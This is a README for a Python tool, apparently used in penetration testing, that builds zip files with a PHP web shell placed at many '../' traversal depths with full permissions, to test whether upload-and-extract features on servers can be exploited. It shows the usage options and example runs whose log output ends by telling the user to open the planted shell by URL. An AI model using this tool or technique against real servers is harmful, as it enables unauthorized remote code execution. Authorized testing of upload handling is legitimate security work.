# ZIP Shotgun

Utility script to test zip file upload functionality (and possible extraction of zip files) for vulnerabilities.
Idea for this script comes from this post on [Silent Signal Techblog - Compressed File Upload And Command Execution](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)
and from [OWASP - Test Upload of Malicious Files](https://www.owasp.org/index.php/Test_Upload_of_Malicious_Files_%28OTG-BUSLOGIC-009%29)

Default webshell is wwwolf's PHP web shell and all the credit for it goes to WhiteWinterWolf. Source is available [HERE](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)

### Installation

1. Install using Python pip

    NOTE: package is not yet available to be installed from pip repository

    ```pip install zip-shotgun --upgrade```

2. Clone git repository and install

    Execute from root directory of the cloned repository (where setup.py file is located)
    
    ```pip install . --upgrade```

### Usage and options

```
Usage: zip-shotgun [OPTIONS] OUTPUT_ZIP_FILE

Options:
  --version                       Show the version and exit.
  -c, --directories-count INTEGER
                                  Count of how many directories to go back
                                  inside the zip file (e.g 3 means that 3
                                  files will be added to the zip: shell.php,
                                  ../shell.php and ../../shell.php where
                                  shell.php is the name of the shell you
                                  provided or randomly generated value
                                  [default: 16]
  -n, --shell-name TEXT           Name of the shell inside the generated zip
                                  file (e.g shell). If not provided it will be
                                  randomly generated, Cannot have whitespaces
  -f, --shell-file-path PATH      A file that contains code for the shell. If
                                  this option is not provided wwwolf
                                  (https://github.com/WhiteWinterWolf/wwwolf-
                                  php-webshell) php shell will be added
                                  instead. If name is provided it will be
                                  added to the zip with the provided name or
                                  if not provided the name will be randomly
                                  generated.
  --compress                      Enable compression. If this flag is set
                                  archive will be compressed using DEFALTE
                                  algorithm with compression level of 9. By
                                  default there is no compression applied.
  -h, --help                      Show this message and exit.
```

### Examples

1. Using all default options

    ```zip-shotgun archive.zip```
    
    Part of the script output
    
    ```
    12/Dec/2018 Wed 23:13:13 +0100 |     INFO | Opening output zip file: REDACTED\zip-shotgun\archive.zip
    12/Dec/2018 Wed 23:13:13 +0100 |  WARNING | Shell name was not provided. Generated random shell name: BCsQOkiN23ur7OUj
    12/Dec/2018 Wed 23:13:13 +0100 |  WARNING | Shell file was not provided. Using default wwwolf's webshell code
    12/Dec/2018 Wed 23:13:13 +0100 |     INFO | Using default file extension for wwwolf's webshell: php
    12/Dec/2018 Wed 23:13:13 +0100 |     INFO | --compress flag was NOT set. Archive will be uncompressed. Files will be only stored.
    12/Dec/2018 Wed 23:13:13 +0100 |     INFO | Writing file to the archive: BCsQOkiN23ur7OUj.php
    12/Dec/2018 Wed 23:13:13 +0100 |     INFO | Setting full read/write/execute permissions (chmod 777) for file: BCsQOkiN23ur7OUj.php
    12/Dec/2018 Wed 23:13:13 +0100 |     INFO | Writing file to the archive: ../BCsQOkiN23ur7OUj.php
    12/Dec/2018 Wed 23:13:13 +0100 |     INFO | Setting full read/write/execute permissions (chmod 777) for file: ../BCsQOkiN23ur7OUj.php
    12/Dec/2018 Wed 23:13:13 +0100 |     INFO | Writing file to the archive: ../../BCsQOkiN23ur7OUj.php
    12/Dec/2018 Wed 23:13:13 +0100 |     INFO | Setting full read/write/execute permissions (chmod 777) for file: ../../BCsQOkiN23ur7OUj.php
    ...
    12/Dec/2018 Wed 23:13:13 +0100 |     INFO | Finished. Try to access shell using BCsQOkiN23ur7OUj.php in the URL
    ```

2. Using default options and enabling compression for archive file

    ```zip-shotgun --compress archive.zip```
    
    Part of the script output
    
    ```
    12/Dec/2018 Wed 23:16:13 +0100 |     INFO | Opening output zip file: REDACTED\zip-shotgun\archive.zip
    12/Dec/2018 Wed 23:16:13 +0100 |  WARNING | Shell name was not provided. Generated random shell name: 6B6NtnZXbXSubDCh
    12/Dec/2018 Wed 23:16:13 +0100 |  WARNING | Shell file was not provided. Using default wwwolf's webshell code
    12/Dec/2018 Wed 23:16:13 +0100 |     INFO | Using default file extension for wwwolf's webshell: php
    12/Dec/2018 Wed 23:16:13 +0100 |     INFO | --compress flag was set. Archive will be compressed using DEFLATE algorithm with a level of 9
    ...
    12/Dec/2018 Wed 23:16:13 +0100 |     INFO | Finished. Try to access shell using 6B6NtnZXbXSubDCh.php in the URL
    ```

3. Using default options but changing the number of directories to go back in the archive to 3

    ```zip-shotgun --directories-count 3 archive.zip```
    
    ```zip-shotgun -c 3 archive.zip```
    
    The script will write 3 files in total to the archive
    
    Part of the script output
    
    ```
    12/Dec/2018 Wed 23:17:43 +0100 |     INFO | Opening output zip file: REDACTED\zip-shotgun\archive.zip
    12/Dec/2018 Wed 23:17:43 +0100 |  WARNING | Shell name was not provided. Generated random shell name: 34Bv9YoignMHgk2F
    12/Dec/2018 Wed 23:17:43 +0100 |  WARNING | Shell file was not provided. Using default wwwolf's webshell code
    12/Dec/2018 Wed 23:17:43 +0100 |     INFO | Using default file extension for wwwolf's webshell: php
    12/Dec/2018 Wed 23:17:43 +0100 |     INFO | --compress flag was NOT set. Archive will be uncompressed. Files will be only stored.
    12/Dec/2018 Wed 23:17:43 +0100 |     INFO | Writing file to the archive: 34Bv9YoignMHgk2F.php
    12/Dec/2018 Wed 23:17:43 +0100 |     INFO | Setting full read/write/execute permissions (chmod 777) for file: 34Bv9YoignMHgk2F.php
    12/Dec/2018 Wed 23:17:43 +0100 |     INFO | Writing file to the archive: ../34Bv9YoignMHgk2F.php
    12/Dec/2018 Wed 23:17:43 +0100 |     INFO | Setting full read/write/execute permissions (chmod 777) for file: ../34Bv9YoignMHgk2F.php
    12/Dec/2018 Wed 23:17:43 +0100 |     INFO | Writing file to the archive: ../../34Bv9YoignMHgk2F.php
    12/Dec/2018 Wed 23:17:43 +0100 |     INFO | Setting full read/write/execute permissions (chmod 777) for file: ../../34Bv9YoignMHgk2F.php
    12/Dec/2018 Wed 23:17:43 +0100 |     INFO | Finished. Try to access shell using 34Bv9YoignMHgk2F.php in the URL
    ```

4. Using default options but providing shell name inside archive and enabling compression

    Shell name cannot have whitespaces
    
    ```zip-shotgun --shell-name custom-name --compress archive.zip```
    
    ```zip-shotgun -n custom-name --compress archive.zip```
    
    Name for shell files inside the archive will be set to the one provided by user.
    
    Part of the script output
    
    ```
    12/Dec/2018 Wed 23:19:12 +0100 |     INFO | Opening output zip file: REDACTED\zip-shotgun\archive.zip
    12/Dec/2018 Wed 23:19:12 +0100 |  WARNING | Shell file was not provided. Using default wwwolf's webshell code
    12/Dec/2018 Wed 23:19:12 +0100 |     INFO | Using default file extension for wwwolf's webshell: php
    12/Dec/2018 Wed 23:19:12 +0100 |     INFO | --compress flag was set. Archive will be compressed using DEFLATE algorithm with a level of 9
    12/Dec/2018 Wed 23:19:12 +0100 |     INFO | Writing file to the archive: custom-name.php
    12/Dec/2018 Wed 23:19:12 +0100 |     INFO | Setting full read/write/execute permissions (chmod 777) for file: custom-name.php
    12/Dec/2018 Wed 23:19:12 +0100 |     INFO | Writing file to the archive: ../custom-name.php
    12/Dec/2018 Wed 23:19:12 +0100 |     INFO | Setting full read/write/execute permissions (chmod 777) for file: ../custom-name.php
    12/Dec/2018 Wed 23:19:12 +0100 |     INFO | Writing file to the archive: ../../custom-name.php
    12/Dec/2018 Wed 23:19:12 +0100 |     INFO | Setting full read/write/execute permissions (chmod 777) for file: ../../custom-name.php
    12/Dec/2018 Wed 23:19:12 +0100 |     INFO | Writing file to the archive: ../../../custom-name.php
    ...
    12/Dec/2018 Wed 23:19:12 +0100 |     INFO | Finished. Try to access shell using custom-name.php in the URL
    ```

5. Provide custom shell file but use random name inside archive. Set directories count to 3

    ```zip-shotgun --directories-count 3 --shell-file-path ./custom-shell.php archive.zip```
    
    ```zip-shotgun -c 3  -f ./custom-shell.php archive.zip```
    
    Shell code will be extracted from user provided file. Names inside the archive will be randomly generated.
    
    Part of the script output
    
    ```
    12/Dec/2018 Wed 23:21:37 +0100 |     INFO | Opening output zip file: REDACTED\zip-shotgun\archive.zip
    12/Dec/2018 Wed 23:21:37 +0100 |  WARNING | Shell name was not provided. Generated random shell name: gqXRAJu1LD8d8VKf
    12/Dec/2018 Wed 23:21:37 +0100 |     INFO | File containing shell code was provided: REDACTED\zip-shotgun\custom-shell.php. Content will be added to archive
    12/Dec/2018 Wed 23:21:37 +0100 |     INFO | Getting file extension from provided shell file for reuse: php
    12/Dec/2018 Wed 23:21:37 +0100 |     INFO | Opening provided file with shell code: REDACTED\zip-shotgun\custom-shell.php
    12/Dec/2018 Wed 23:21:37 +0100 |     INFO | --compress flag was NOT set. Archive will be uncompressed. Files will be only stored.
    12/Dec/2018 Wed 23:21:37 +0100 |     INFO | Writing file to the archive: gqXRAJu1LD8d8VKf.php
    12/Dec/2018 Wed 23:21:37 +0100 |     INFO | Setting full read/write/execute permissions (chmod 777) for file: gqXRAJu1LD8d8VKf.php
    12/Dec/2018 Wed 23:21:37 +0100 |     INFO | Writing file to the archive: ../gqXRAJu1LD8d8VKf.php
    12/Dec/2018 Wed 23:21:37 +0100 |     INFO | Setting full read/write/execute permissions (chmod 777) for file: ../gqXRAJu1LD8d8VKf.php
    12/Dec/2018 Wed 23:21:37 +0100 |     INFO | Writing file to the archive: ../../gqXRAJu1LD8d8VKf.php
    12/Dec/2018 Wed 23:21:37 +0100 |     INFO | Setting full read/write/execute permissions (chmod 777) for file: ../../gqXRAJu1LD8d8VKf.php
    12/Dec/2018 Wed 23:21:37 +0100 |     INFO | Finished. Try to access shell using gqXRAJu1LD8d8VKf.php in the URL
    ```
    
6. Provide custom shell file and set shell name to save inside archive. Set directories count to 3 and use compression

    ```zip-shotgun --directories-count 3 --shell-name custom-name --shell-file-path ./custom-shell.php --compress archive.zip```
    
    ```zip-shotgun -c 3 -n custom-name -f ./custom-shell.php --compress archive.zip```
    
    Shell code will be extracted from user provided file. Names inside the archive will be set to user provided name.
    
    Part of the script output
    
    ```
    12/Dec/2018 Wed 23:25:19 +0100 |     INFO | Opening output zip file: REDACTED\zip-shotgun\archive.zip
    12/Dec/2018 Wed 23:25:19 +0100 |     INFO | File containing shell code was provided: REDACTED\zip-shotgun\custom-shell.php. Content will be added to archive
    12/Dec/2018 Wed 23:25:19 +0100 |     INFO | Getting file extension from provided shell file for reuse: php
    12/Dec/2018 Wed 23:25:19 +0100 |     INFO | Opening provided file with shell code: REDACTED\zip-shotgun\custom-shell.php
    12/Dec/2018 Wed 23:25:19 +0100 |     INFO | --compress flag was set. Archive will be compressed using DEFLATE algorithm with a level of 9
    12/Dec/2018 Wed 23:25:19 +0100 |     INFO | Writing file to the archive: custom-name.php
    12/Dec/2018 Wed 23:25:19 +0100 |     INFO | Setting full read/write/execute permissions (chmod 777) for file: custom-name.php
    12/Dec/2018 Wed 23:25:19 +0100 |     INFO | Writing file to the archive: ../custom-name.php
    12/Dec/2018 Wed 23:25:19 +0100 |     INFO | Setting full read/write/execute permissions (chmod 777) for file: ../custom-name.php
    12/Dec/2018 Wed 23:25:19 +0100 |     INFO | Writing file to the archive: ../../custom-name.php
    12/Dec/2018 Wed 23:25:19 +0100 |     INFO | Setting full read/write/execute permissions (chmod 777) for file: ../../custom-name.php
    12/Dec/2018 Wed 23:25:19 +0100 |     INFO | Finished. Try to access shell using custom-name.php in the URL
    ```
